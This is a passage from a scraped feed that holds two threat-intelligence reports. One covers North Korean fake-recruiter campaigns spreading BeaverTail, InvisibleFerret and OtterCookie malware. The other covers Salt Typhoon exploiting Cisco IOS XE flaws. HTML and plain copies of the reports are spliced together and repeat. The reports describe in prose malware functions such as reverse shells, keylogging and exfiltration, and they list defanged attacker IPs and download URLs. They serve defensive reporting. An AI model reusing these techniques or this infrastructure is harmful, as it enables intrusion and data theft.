actors.</p>\n        <h2>Threat Analysis</h2>\n        <h3>PurpleBravo</h3>\n        <p>The Contagious Interview campaign, first <a href=\"https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/\">documented</a> in November 2023, targeted software developers primarily in the cryptocurrency space and was attributed to North Korea. The campaign used the JavaScript infostealer BeaverTail, the cross-platform Python backdoor InvisibleFerret, and most recently OtterCookie, a new backdoor <a href=\"https://jp.security.ntt/tech_blog/contagious-interview-ottercookie\">identified</a> in December 2024. The group responsible for this activity is known as CL-STA-0240, Famous Chollima, and Tenacious Pungsan in open sources. Insikt Group has given this cluster of activity the designation PurpleBravo (formerly TAG-120).</p>\n        <h4>PurpleBravo’s Fraudulent Profiles</h4>\n        <p>On December 3, 2024, a developer posted a <a href=\"https://sohay666.github.io/article/en/reversing-scam-interview-base-on-js-project.html\">blog</a> about their experience with a suspected PurpleBravo operator. An individual claiming to be a recruiter contacted them about a job offer and then followed up with an interview. During the interview, the interviewer asked the developer to download a coding challenge from a repository. The developer realized there was a malicious function in the file and ended the interview. While the developer does not attribute the malware or actor, Insikt Group assesses with high confidence the file is a BeaverTail infostealer.</p>\n        <p>The interviewer used a LinkedIn account with the name Javier Fiesco, who describes themself as the CTO of AgencyHill99. Further investigation into Javier Fiesco <a href=\"https://remote3.co/p/javier0923\">uncovered</a> an individual with the same name available for work on remote3, a Web3 development job board. The website <em>agencyhill99[.]com</em> was registered on Hostinger on September 13, 2024. As of early February 2025, this website no longer resolved, but it previously <a href=\"https://urlscan.io/result/cf20d730-529f-42fe-b5dc-befb1d9b8a66\">displayed</a> a Hostinger landing page.

The profile on DoraHacks states that AgencyHill99 is looking to hire a developer. Insikt Group also discovered a <a href=\"https://intch.org/company/agencyhill99\">company</a> with the name Agencyhill99 on the website Intch, a part-time and remote job platform.

The link was then updated to <em>hxxp://locahost[:]3000/BattleTank[.]rar</em>.</p>\n        <h4>PurpleBravo Malware and Infrastructure</h4>\n        <p>PurpleBravo uses the malware families BeaverTail, InvisibleFerret, and OtterCookie. BeaverTail is a malware family initially distributed via NPM packages as a JavaScript payload and later as executables and downloaders targeting Windows and macOS environments. BeaverTail also acts as an infostealer, gathering cryptocurrency wallet and browser information. InvisibleFerret is a collection of post-compromise payloads that collectively act as a backdoor in victim environments. InvisibleFerret introduces additional malicious payloads into victim environments, performs information stealing and fingerprinting actions within the victim environment, and leverages legitimate protocols and software for C2 communications. Like InvisibleFerret, OtterCookie is a post-compromise malware family used as a backdoor, which establishes C2 connectivity via Socket[.]IO, receives and executes shell commands from C2 servers, and exfiltrates sensitive victim data.</p>\n        <p>Insikt Group analyzed BeaverTail, InvisibleFerret, and OtterCookie malware samples (See <strong>Appendix B</strong> for related file hashes). The BeaverTail samples were identified as PE variants targeting Windows environments. These samples included URLs linked to <em>freeconference[.]com</em>, a legitimate conferencing website, which aligns with Unit42’s <a href=\"https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/\">findings</a> of Contagious Interview payloads posing as FreeConference executables. The OtterCookie samples were two separate versions of the malware family; however, static analysis of these samples included strings that demonstrated both samples’ ability to gather and send system fingerprinting information to attacker C2 servers, including strings that indicated OtterCookie is capable of identifying cryptocurrency assets and sensitive information found in specific file types by using regex patterns, including executables, photos, and config and env files, among others.</p>\n        <p>The InvisibleFerret samples analyzed were Python scripts with the following functionalities:</p>\n        <ul>\n          <li>Determining victim device location via local IP address lookup</li>\n          <li>Fingerprinting device details (user and hostname)</li>\n          <li>Connecting to a Base64-encoded C2 address via HTTP POST requests</li>\n          <li>Performing local directory discovery using hard-coded strings</li>\n          <li>Creating a reverse shell for SSH session management and data exfiltration</li>\n          <li>Copying clipboard data, keylogging, and tracking mouse movements.</li>\n        </ul>\n        <p>Previous samples of InvisibleFerret were <a href=\"https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west\">analyzed</a> by Zscaler, which described a two-part infection chain in which the initial reconnaissance took place over HTTP traffic and FTP was used for data exfiltration, as shown in <strong>Figure 2</strong>.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"InvisibleFerret\" src=\"https://www.recordedfuture.com/media_1c3996ea7e06ae3a5c9e3721ea05f2758de8cadfa.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"767\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 2</em></strong><em>: InvisibleFerret Infection chain (Source: Recorded Future and</em> <em><a href=\"https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west\">Zscaler</a>)</em></div>\n          </div>\n        </div>\n        <p>Insikt Group identified 21 PurpleBravo servers between August 2024 and February 2025 (see <strong>Appendix B</strong> for the complete list).

Insikt Group has previously observed other North Korean threat groups favor many of these hosting providers. In addition to the C2 servers, using Recorded Future Network Intelligence, Insikt Group observed at least seven suspected victims between September 2024 and February 13, 2025. The victims are located in at least six countries, including the United Arab Emirates, Costa Rica, India, Vietnam, Türkiye, and South Korea. Open-source <a href=\"https://spur.us/astrill-vpn-and-remote-worker-fraud/\">research</a> identified Astrill VPN as a favored service by North Korean IT workers, with <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat\">evidence</a> that they use the service with remote administration tools. Insikt Group also observed network traffic between known Astrill VPN endpoints and PurpleBravo servers, corroborating this connection.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"PurpleBravo victims\" src=\"https://www.recordedfuture.com/media_1f8bd975fe32910ab7b50d3ab921bd5a598141fb7.png?width=750&amp;format=png&amp;optimize=medium\" width=\"600\" height=\"371\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 3</em></strong><em>: Location of PurpleBravo victims (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>At least three victims in the cryptocurrency space were identified in the findings summarized below:</p>\n        <ul>\n          <li>On October 3, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a market-making company in the cryptocurrency space based in the United Arab Emirates.

As these operations continue to evolve, businesses, governments, and cybersecurity organizations must work together to close the gaps that enable North Korea to exploit the remote work environment.\nKey Findings\nNorth Korea’s use of IT workers to secure fraudulent employment and execute coordinated cyber campaigns highlights its evolving tactics to fund its military programs while undermining global intellectual property security.\nInsikt Group assesses that PurpleBravo has targeted at least seven entities, three of which are in the cryptocurrency sector, including a market-making firm, an online casino, and a software company.\nInsikt Group found evidence that PurpleBravo uses Astrill VPN to manage its command-and-control (C2) servers.\nPurpleBravo was found posting job advertisements on at least three hiring websites, Telegram, and GitHub.\nInsikt Group identified at least seven suspected North Korean-linked front companies operating in China spoofing legitimate IT firms in China, India, Pakistan, Ukraine, and the United States (US).\nOrganizations should implement robust technical safeguards, such as, where feasible, disabling remote desktop software, conducting regular checks of open ports across networks, deploying insider threat monitoring, and geolocating devices.\nInsikt Group expects to continue to see groups like PurpleBravo and TAG-121 exploit the remote work environment, threatening global IT supply chains and intellectual property.\nNorth Korea’s shift toward fraudulent remote employment and front companies will likely outpace traditional hiring protocol checks, driving organizations and governments to adopt more rigorous identity verification, enhanced remote work security, and robust international intelligence-sharing to counter this expanding threat.\nBackground\nOn January 23, 2025, the US Department of Justice (US DOJ) indicted two North Korean nationals and three facilitators for remote worker fraud that enriched the North Korean regime. In the indictment, the US DOJ described a six-year scheme in which two US citizens and one Mexican national conspired with North Korean IT workers to remotely work for at least 64 US companies. Payments from ten companies generated at least $866,255 in revenue that was laundered through a Chinese bank account. In addition to the indictment, stories of organizations and individuals that have come across North Korean IT workers can be regularly found in open sources (1, 2, 3). Besides sanctions violations, the threat from these workers, whether stealing sensitive data or installing malware on internal systems, presents unique challenges to organizations, especially in remote work environments.\nNorth Korea remains highly isolated from the outside world due to the regime’s strict control over goods, people, and information, as well as international sanctions placed upon the country. Despite this, Pyongyang’s leadership is well-versed in exploiting emerging technologies to fund its operations. As sanctions have tightened, the regime adapted by escalating illicit activities, including smuggling and cybercrime. In recent years, the regime has achieved significant success in stealing from traditional financial institutions and digital assets like cryptocurrency. Between 2020 and 2024, the rise of remote work created new opportunities for North Korea to deploy skilled IT workers who infiltrate global companies under false identities. Their activities directly support the regime’s military programs while posing a significant threat to industries reliant on intellectual property.\nResearch into North Korean IT workers has focused on the following aspects of the threat: North Korean IT workers gaining fraudulent employment through proxies; North Korean front companies, often in the software development space, imitating legitimate organizations; and fake employment opportunities targeting software developers in cryptocurrency and AI, among other industries. Other research has established links between IT workers and ongoing malicious campaigns by North Korean threat actors.\nThreat Analysis\nPurpleBravo\nThe Contagious Interview campaign, first documented in November 2023, targeted software developers primarily in the cryptocurrency space and was attributed to North Korea. The campaign used the JavaScript infostealer BeaverTail, the cross-platform Python backdoor InvisibleFerret, and most recently OtterCookie, a new backdoor identified in December 2024. The group responsible for this activity is known as CL-STA-0240, Famous Chollima, and Tenacious Pungsan in open sources. Insikt Group has given this cluster of activity the designation PurpleBravo (formerly TAG-120).\nPurpleBravo’s Fraudulent Profiles\nOn December 3, 2024, a developer posted a blog about their experience with a suspected PurpleBravo operator. An individual claiming to be a recruiter contacted them about a job offer and then followed up with an interview. During the interview, the interviewer asked the developer to download a coding challenge from a repository. The developer realized there was a malicious function in the file and ended the interview. While the developer does not attribute the malware or actor, Insikt Group assesses with high confidence the file is a BeaverTail infostealer.\nThe interviewer used a LinkedIn account with the name Javier Fiesco, who describes themself as the CTO of AgencyHill99. Further investigation into Javier Fiesco uncovered an individual with the same name available for work on remote3, a Web3 development job board. The website agencyhill99[.]com was registered on Hostinger on September 13, 2024. As of early February 2025, this website no longer resolved, but it previously displayed a Hostinger landing page. Research into AgencyHill99 uncovered a job posting seeking a developer with blockchain knowledge on levels[.]fyi, with the following contact info:\nContact us: alexander@agencyhill99[.]com\nRecruiter: vision.founder1004@gmail[.]com\nPivoting on the text in the job description returned two private job postings on Upwork (1, 2). Additionally, a profile with the name of Lucifer, and what appears to be an AI-generated headshot, who works for AgencyHill99 was observed on the website DoraHacks, which is a hackathon, bounty, and grant organization. The profile on DoraHacks states that AgencyHill99 is looking to hire a developer. Insikt Group also discovered a company with the name Agencyhill99 on the website Intch, a part-time and remote job platform. The company posted a “Part-Time IT Developer Opportunity” by an individual with the name Newton Curtis, who is a recruiter at AgencyHill99.\nFigure 1: PurpleBravo operator’s account on DoraHacks (Source: DoraHacks)\nInsikt Group found several posts in Telegram channels from individuals with @agencyhill99[.]com email addresses advertising jobs. Below is a summary of the posts:\nOn September 16, 2024, an account with the username Dale_V and email address ayat@agencyhill99[.]com posted in the Telegram channel “freelancerclients” that they were looking to hire a developer.\nOn September 26, 2024, an account with the username jaxtonhol and email address ysai@agencyhill99[.]com posted in the Telegram channel “indeedemploijobeur” that they were looking to hire a developer. On the same day, the account Dale_V using the email ysai@agencyhill99[.]com posted in the Telegram channel “cryptolux_b” that they were looking to hire a blockchain developer. They posted the same message in the “itkita”, “andexzuxiaomichat”, and “usvacancy” channels. On September 27, 2024, Dale_V posted the same message in the “crypto_brazil” and “cryptolux_br” channels.\nOn October 2, 2024, Dale_V posted the same message with a new email address, sam@agencyhill99[.]com, in the “fortifiedx_chat”, “family_indonesia_uae_ph”, “cryptolux_br”, and “freelancerclients” channels.\nOn October 3, 2024, a user in an Indonesian-language Telegram channel posted a screenshot of an email message they received from PurpleBravo operators.\nOn October 9, 2024, Dale_V posted job advertisements in the “andexzuxiaomichat”, “family_indonesia_uae_ph”, “cryptolux_br”, “crypto_brazil”, and “freelancerclients” channels.\nOn October 22, 2024, Dale_V posted in the Telegram channel “hiringofm” seeking individuals to help maintain a game called Destiny War, and added the X link, hxxps://twitter[.]com/destinywarnft. It is unclear if the actor controls this X account or game.\nOn November 13, 2024, the Telegram user jaxtonhol posted in the Telegram channel “near_jobs” seeking blockchain engineers. The same user posted again on December 7, 2024, in the same channel with the email address ysai@agencyhill99[.]com.\nOn November 30, 2024, a Telegram user posted asking if a job offer on LinkedIn from the account mentioned above, Javier Feisco associated with Agencyhill99, was legitimate and shared a screenshot of the message.\nGitHub Repository\nInsikt Group discovered a GitHub repository named agencyhill99 with the email address admin@agencyhill99[.]com. A GitHub user, dev-astro-star, made several commits to the repository between October 9 and 19, 2024. Based on the commits, it appears the website used Firebase, a Google backend service for web applications. The user added a button to download a file at the Google Drive link https://drive.google[.]com/uc?id=166zcmpqj-C7NPltm4iwRolz8XuxqZIXt, which is no longer accessible. The email address admin@agencyhill99[.]com was also added to the repository, along with the Telegram channel hxxps://t[.]me/+2AurfGZWxZo0MDgx, which is also no longer live. The user also added a download link to hxxp://65.108.20[.]73/BattleTank[.]exe, which is no longer live and was later updated to hxxp://65.108.20[.]73[:]3000/BattleTank[.]exe. Port 3000 was open from October 20, 2024, to November 22, 2024, on 65.108.20[.]73. The link was then updated to hxxp://locahost[:]3000/BattleTank[.]rar.\nPurpleBravo Malware and Infrastructure\nPurpleBravo uses the malware families BeaverTail, InvisibleFerret, and OtterCookie. BeaverTail is a malware family initially distributed via NPM packages as a JavaScript payload and later as executables and downloaders targeting Windows and macOS environments. BeaverTail also acts as an infostealer, gathering cryptocurrency wallet and browser information. InvisibleFerret is a collection of post-compromise payloads that collectively act as a backdoor in victim environments. InvisibleFerret introduces additional malicious payloads into victim environments, performs information stealing and fingerprinting actions within the victim environment, and leverages legitimate protocols and software for C2 communications. Like InvisibleFerret, OtterCookie is a post-compromise malware family used as a backdoor, which establishes C2 connectivity via Socket[.]IO, receives and executes shell commands from C2 servers, and exfiltrates sensitive victim data.\nInsikt Group analyzed BeaverTail, InvisibleFerret, and OtterCookie malware samples (See Appendix B for related file hashes). The BeaverTail samples were identified as PE variants targeting Windows environments. These samples included URLs linked to freeconference[.]com, a legitimate conferencing website, which aligns with Unit42’s findings of Contagious Interview payloads posing as FreeConference executables. The OtterCookie samples were two separate versions of the malware family; however, static analysis of these samples included strings that demonstrated both samples’ ability to gather and send system fingerprinting information to attacker C2 servers, including strings that indicated OtterCookie is capable of identifying cryptocurrency assets and sensitive information found in specific file types by using regex patterns, including executables, photos, and config and env files, among others.\nThe InvisibleFerret samples analyzed were Python scripts with the following functionalities:\nDetermining victim device location via local IP address lookup\nFingerprinting device details (user and hostname)\nConnecting to a Base64-encoded C2 address via HTTP POST requests\nPerforming local directory discovery using hard-coded strings\nCreating a reverse shell for SSH session management and data exfiltration\nCopying clipboard data, keylogging, and tracking mouse movements.\nPrevious samples of InvisibleFerret were analyzed by Zscaler, which described a two-part infection chain in which the initial reconnaissance took place over HTTP traffic and FTP was used for data exfiltration, as shown in Figure 2.\nFigure 2: InvisibleFerret Infection chain (Source: Recorded Future and Zscaler)\nInsikt Group identified 21 PurpleBravo servers between August 2024 and February 2025 (see Appendix B for the complete list). The majority of servers use Tier[.]Net hosting, with Majestic Hosting, Stark Industries, Leaseweb Singapore, and Kaopu Cloud HK also being used in this campaign. Insikt Group has previously observed other North Korean threat groups favor many of these hosting providers. In addition to the C2 servers, using Recorded Future Network Intelligence, Insikt Group observed at least seven suspected victims between September 2024 and February 13, 2025. The victims are located in at least six countries, including the United Arab Emirates, Costa Rica, India, Vietnam, Türkiye, and South Korea. Open-source research identified Astrill VPN as a favored service by North Korean IT workers, with evidence that they use the service with remote administration tools. Insikt Group also observed network traffic between known Astrill VPN endpoints and PurpleBravo servers, corroborating this connection.\nFigure 3: Location of PurpleBravo victims (Source: Recorded Future)\nAt least three victims in the cryptocurrency space were identified in the findings summarized below:\nOn October 3, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a market-making company in the cryptocurrency space based in the United Arab Emirates. Shortly after the reconnaissance traffic, we observed likely exfiltration FTP traffic between the same IP addresses.\nOn October 15, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a gambling company that offers online games and sells slot machines in the cryptocurrency space. The company is registered in Costa Rica. Reconnaissance traffic followed by FTP exfiltration traffic was observed between the C2 and the company's infrastructure on November 25 and 26, 2024.\nOn October 2, 2024, Insikt Group observed potential FTP exfiltration traffic between a BeaverTail C2 and a software development company based in India that builds blockchain, AI, and mobile, among other applications.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_11aa5a77944f8c8dfe0a5f530987f0bb21d4c7794.png?width=1200&format=pjpg&optimize=medium"},"content":"Learn how North Korea’s IT workers infiltrate global companies, posing cybersecurity threats, committing fraud, and supporting the regime.

Victim organizations included a United States-based affiliate of a United Kingdom-based telecommunications provider and a South African telecommunications provider. Insikt Group attributes this activity to the Chinese state-sponsored threat activity group tracked by Insikt Group as RedMike, which aligns with the Microsoft-named group Salt Typhoon. Using Recorded Future® Network Intelligence, Insikt Group observed RedMike target and exploit unpatched Cisco network devices vulnerable to CVE-2023-20198, a privilege escalation vulnerability found in the web user interface (UI) feature in Cisco IOS XE software, for initial access before exploiting an associated privilege escalation vulnerability, CVE-2023-20273, to gain root privileges. RedMike reconfigures the device, adding a generic routing encapsulation (GRE) tunnel for persistent access.</p>\n        <p>RedMike has attempted to exploit more than 1,000 Cisco devices globally. The group likely compiled a list of target devices based on their association with telecommunications providers' networks. Insikt Group also observed RedMike targeting devices associated with universities in Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the United States (US), and Vietnam. RedMike possibly targeted these universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like UCLA and TU Delft. In addition to this activity, in mid-December 2024, RedMike also carried out a reconnaissance of multiple IP addresses owned by a Myanmar-based telecommunications provider, Mytel.</p>\n        <p>Unpatched public-facing appliances serve as direct entry points into an organization’s infrastructure. Sophisticated Chinese threat activity groups have <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf\">shifted</a> heavily toward exploiting these devices for initial access over the past five years. RedMike’s exploitation of telecommunications infrastructure goes beyond technical vulnerabilities and represents a strategic intelligence threat. Persistent access to critical communications networks enables state-backed threat actors to monitor confidential conversations, manipulate data flows, and disrupt services during geopolitical conflicts. RedMike’s targeting of lawful intercept programs and US political figures highlights the strategic intelligence objectives behind these operations and the national security threat they pose.</p>\n        <p>Organizations, particularly those in the telecommunications industry, must prioritize remediating exposed network devices, as unpatched systems remain a key initial access vector for Chinese state-sponsored threat activity groups. Network administrators should implement strict access controls, disable unnecessary web UI exposure, and monitor for unauthorized configuration changes. Individuals should use end-to-end encrypted communication methods for sensitive information, just as the Cybersecurity and Infrastructure Agency (CISA) and the Federal Bureau of Investigation (FBI) recommended, which is crucial to mitigate potential eavesdropping risks.</p>\n        <p>Additionally, governments and cybersecurity entities should improve threat intelligence sharing and impose stricter regulatory compliance for network security. While the US sanctions on RedMike-affiliated Sichuan Juxinhe Network Technology signal a more assertive and commendable stance against state-backed cyber espionage in critical infrastructure, robust international cooperation is crucial for effectively countering these persistent threats.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Despite significant media coverage and US sanctions, RedMike continues to compromise telecommunications providers globally, including in the US.</li>\n          <li>RedMike compromised Cisco network devices of a US-based affiliate of a United Kingdom (UK) telecommunications provider and a South African telecommunications provider.</li>\n          <li>RedMike exploited privilege escalation vulnerabilities CVE-2023-20198 and CVE-2023-20273 to compromise unpatched Cisco network devices running Cisco IOS XE software.</li>\n          <li>Using Recorded Future Network Intelligence, Insikt Group identified RedMike attempting to exploit over 1,000 Cisco network devices between December 2024 and January 2025.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>In late September 2024, media reporting (<a href=\"https://www.wsj.com/politics/national-security/china-cyberattack-internet-providers-260bd835?st=cYA8J5&amp;reflink=desktopwebshare_permalink\">1</a>, <a href=\"https://www.securityweek.com/chinas-salt-typhoon-hacked-att-verizon-report/\">2</a>) stated that the Chinese state-sponsored group Salt Typhoon had compromised the networks of major US telecommunications companies, including Verizon (<a href=\"/research/redmike-salt-typhoon-exploits-vulnerable-devices?host=https%3A%2F%2Fwww.recordedfuture.com\">1</a>), AT&amp;T, and Lumen Technologies. The activity likely affected telecommunications organizations globally, with some outlets <a href=\"https://www.politico.com/newsletters/national-security-daily/2024/12/12/we-need-to-talk-about-salt-typhoon-00183727\">reporting</a> that Salt Typhoon compromised at least 80 organizations. SaltTyphoon used its access to telecommunications providers to snoop on <a href=\"https://www.darkreading.com/cyber-risk/salt-typhoon-apt-subverts-law-enforcement-wiretapping\">US lawful intercept</a> targets and <a href=\"https://www.politico.com/news/2024/10/25/trump-hack-china-phones-00185608\">intercept</a> the communications of significant US political figures. The effect of Salt Typhoon’s intrusions has reached the highest levels of the US government: Cybersecurity experts have <a href=\"https://www.reuters.com/world/us/us-agencies-brief-senators-chinese-salt-typhoon-telecom-hacking-2024-12-04/\">briefed</a> the US Senate, CISA recently <a href=\"https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure\">issued</a> guidance on hardening telecommunications infrastructure, and CISA and the FBI issued a joint <a href=\"https://www.forbes.com/sites/zakdoffman/2024/12/06/fbi-warns-iphone-and-android-users-stop-sending-texts/\">warning</a> encouraging the use of encrypted end-to-end messaging applications for sensitive communications.</p>\n        <p>Insikt Group tracks Salt Typhoon-aligned activity as RedMike. Salt Typhoon is a group name given by Microsoft Threat Intelligence; at this time, Microsoft has not published publicly available technical details of the group's activity. The only public information Microsoft has shared confirms an <a href=\"https://learn.microsoft.com/en-us/defender-xdr/microsoft-threat-actor-naming\">overlap</a> with two existing threat activity group names: GhostEmperor (<a href=\"https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/\">Kaspersky</a>) and FamousSparrow (<a href=\"https://www.welivesecurity.com/2021/09/23/famoussparrow-suspicious-hotel-guest/\">ESET</a>).</p>\n        <p>On January 17, 2025, the US Department of the Treasury’s Office of Foreign Assets Control (OFAC) <a href=\"https://home.treasury.gov/news/press-releases/jy2792\">sanctioned</a> Sichuan-based cybersecurity company Sichuan Juxinhe Network Technology Co., Ltd. for their direct involvement with RedMike activity. OFAC stated that Sichuan Juxinhe Network Technology Co., Ltd. had direct involvement in exploiting US telecommunications and internet service provider companies. According to OFAC, China’s Ministry of State Security (MSS) has maintained strong ties with multiple computer network exploitation companies, including Sichuan Juxinhe.</p>\n        <h2>Technical Analysis</h2>\n        <h3>Cisco IOS XE Web UI Exploitation</h3>\n        <p>Using Recorded Future Network Intelligence, Insikt Group identified that since early December 2024, RedMike has attempted to exploit over 1,000 internet-facing Cisco network devices worldwide, primarily those associated with telecommunications providers, using a combination of two privilege escalation vulnerabilities: CVE-2023-20198 and CVE-2023-20273. When successfully compromised, the group uses the new privileged user account to change the device's configuration and adds a GRE tunnel for persistent access and data exfiltration.</p>\n        <p>The privilege escalation vulnerability CVE-2023-20198 was found in the Cisco IOS XE software web UI feature, version 16 and earlier, and <a href=\"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z\">published</a> by Cisco in October 2023. Attackers exploit this vulnerability to gain initial access to the device and issue a privilege 15 command to create a local user and password. Following this, the attacker uses the new local account to access the device and exploits an associated privilege escalation vulnerability, CVE-2023-20273, to gain root user privileges.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"RedMike Cisco network\" src=\"https://www.recordedfuture.com/media_1a56193b14d5953f02146416847d3dd30534ac3f8.png?width=750&amp;format=png&amp;optimize=medium\" width=\"956\" height=\"625\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 1:</em></strong> <em>RedMike Cisco network device exploitation infrastructure (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>More than half of the Cisco devices targeted by RedMike were in the US, South America, and India. The remaining devices spanned over 100 other countries. Although the selected devices are primarily associated with telecommunications providers, thirteen were linked to universities across Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the US, and Vietnam.</p>\n        <p>Often involved in cutting-edge research, universities are prime targets for Chinese state-sponsored threat activity groups to acquire valuable research data and intellectual property. Previous examples include APT40, which has <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-200a\">targeted</a> universities for biomedical, robotics, and maritime research; RedGolf (APT41) <a href=\"https://www.justice.gov/archives/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer\">for</a> medical research; and RedBravo (APT31), which has directly <a href=\"https://www.reuters.com/technology/cybersecurity/apt31-chinese-hacking-group-behind-global-cyberespionage-campaign-2024-03-26/\">targeted</a> academics. China’s cyber strategy <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf\">aligns</a> with its broader economic and military goals, making universities high-value targets for long-term intelligence-gathering and technology acquisition.</p>\n        <p>RedMike possibly targeted the following universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like <a href=\"https://wireless.ee.ucla.edu/research/\">UCLA</a> and <a href=\"https://www.tudelft.nl/onderwijs/opleidingen/masters/ee/msc-electrical-engineering/track-wireless-communication-and-sensing/related-research/\">TU Delft</a>.</p>\n        <ul>\n          <li>University of California, Los Angeles (UCLA) — US</li>\n          <li>California State University, Office of the Chancellor (CENIC) — US</li>\n          <li>Loyola Marymount University — US</li>\n          <li>Utah Tech University — US</li>\n          <li>Universidad de La Punta — Argentina</li>\n          <li>Islamic University of Technology (IUT) — Bangladesh</li>\n          <li>Universitas Sebelas Maret — Indonesia</li>\n          <li>Universitas Negeri Malang — Indonesia</li>\n          <li>University of Malaya — Malaysia</li>\n          <li>Universidad Nacional Autonoma — Mexico</li>\n          <li>Technische Universiteit Delft — The Netherlands</li>\n          <li>Sripatum University — Thailand</li>\n          <li>University of Medicine and Pharmacy at Ho Chi Minh City — Vietnam</li>\n        </ul>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"Geographical spread of Cisco\" src=\"https://www.recordedfuture.com/media_198e0c82ae4d2f83fa03461354718eb0b13ee2dac.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1030\" height=\"637\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 2</em></strong><em>: Geographical spread of Cisco devices targeted by RedMike (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>RedMike’s scanning and exploitation activity occurred on six different occasions from December 2024 to January 2025.</p>\n        <ul>\n          <li>2024-12-04</li>\n          <li>2024-12-10</li>\n          <li>2024-12-17</li>\n          <li>2024-12-24</li>\n          <li>2025-01-13</li>\n          <li>2025-01-23</li>\n        </ul>\n        <p>Network administrators operating a Cisco network device with IOS XE software web UI exposed to the internet can use the dates mentioned and advice in the mitigations section to identify potential RedMike exploitation activity.</p>\n        <p>Using internet scanning data, Insikt Group identified more than 12,000 Cisco network devices with their web UIs exposed to the internet. Although over 1,000 Cisco devices were targeted, Insikt Group assesses that this activity was likely focussed, given that this number only represents 8% of the exposed devices and that RedMike engaged in periodic reconnaissance activity, selecting devices linked to telecommunications providers.</p>\n        <h3>Compromised Telecommunications Provider Devices</h3>\n        <p>Using Recorded Future Network Intelligence, Insikt Group observed seven compromised Cisco network devices communicating with RedMike infrastructure. These include devices associated with:</p>\n        <ul>\n          <li>A US-based affiliate of a UK telecommunications provider</li>\n          <li>A US internet service provider (ISP) and telecommunications company</li>\n          <li>A South African telecommunications provider</li>\n          <li>An Italian ISP</li>\n          <li>A large Thailand telecommunications provider</li>\n        </ul>\n        <p>RedMike configured GRE tunnels between the compromised Cisco devices and their infrastructure. GRE is a tunneling protocol used to encapsulate various network layer protocols inside point-to-point connections. It is a standard feature that can be configured on Cisco network devices. It is commonly used to create virtual private networks (VPNs), enable interoperability between different network types, and transport multicast or non-IP traffic over IP networks. Threat activity groups use GRE tunnels to maintain persistence by establishing covert communication channels that bypass firewalls and intrusion detection systems. These tunnels also facilitate stealthy data exfiltration by encapsulating stolen data within GRE packets, potentially bypassing network monitoring.</p>\n        <h3>Reconnaissance of Myanmar Telecommunications Provider</h3>\n        <p>In mid-December 2024, RedMike, from the same infrastructure that exploited the Cisco network devices, performed reconnaissance against multiple infrastructure assets operated by a Myanmar-based telecommunications provider, Mytel, likely including their corporate mail server.</p>\n        <p>To read the entire analysis, <a href=\"https://assets.recordedfuture.com/insikt-report-pdfs/2025/cta-cn-2025-0213.pdf\">click here</a> to download the report as a PDF.</p>\n      ","content:encodedSnippet":"Executive Summary\nBetween December 2024 and January 2025, Recorded Future’s Insikt Group identified a campaign exploiting unpatched internet-facing Cisco network devices primarily associated with global telecommunications providers.

While the US sanctions on RedMike-affiliated Sichuan Juxinhe Network Technology signal a more assertive and commendable stance against state-backed cyber espionage in critical infrastructure, robust international cooperation is crucial for effectively countering these persistent threats.\nKey Findings\nDespite significant media coverage and US sanctions, RedMike continues to compromise telecommunications providers globally, including in the US.\nRedMike compromised Cisco network devices of a US-based affiliate of a United Kingdom (UK) telecommunications provider and a South African telecommunications provider.\nRedMike exploited privilege escalation vulnerabilities CVE-2023-20198 and CVE-2023-20273 to compromise unpatched Cisco network devices running Cisco IOS XE software.\nUsing Recorded Future Network Intelligence, Insikt Group identified RedMike attempting to exploit over 1,000 Cisco network devices between December 2024 and January 2025.\nBackground\nIn late September 2024, media reporting (1, 2) stated that the Chinese state-sponsored group Salt Typhoon had compromised the networks of major US telecommunications companies, including Verizon (1), AT&T, and Lumen Technologies. The activity likely affected telecommunications organizations globally, with some outlets reporting that Salt Typhoon compromised at least 80 organizations. SaltTyphoon used its access to telecommunications providers to snoop on US lawful intercept targets and intercept the communications of significant US political figures. The effect of Salt Typhoon’s intrusions has reached the highest levels of the US government: Cybersecurity experts have briefed the US Senate, CISA recently issued guidance on hardening telecommunications infrastructure, and CISA and the FBI issued a joint warning encouraging the use of encrypted end-to-end messaging applications for sensitive communications.\nInsikt Group tracks Salt Typhoon-aligned activity as RedMike. Salt 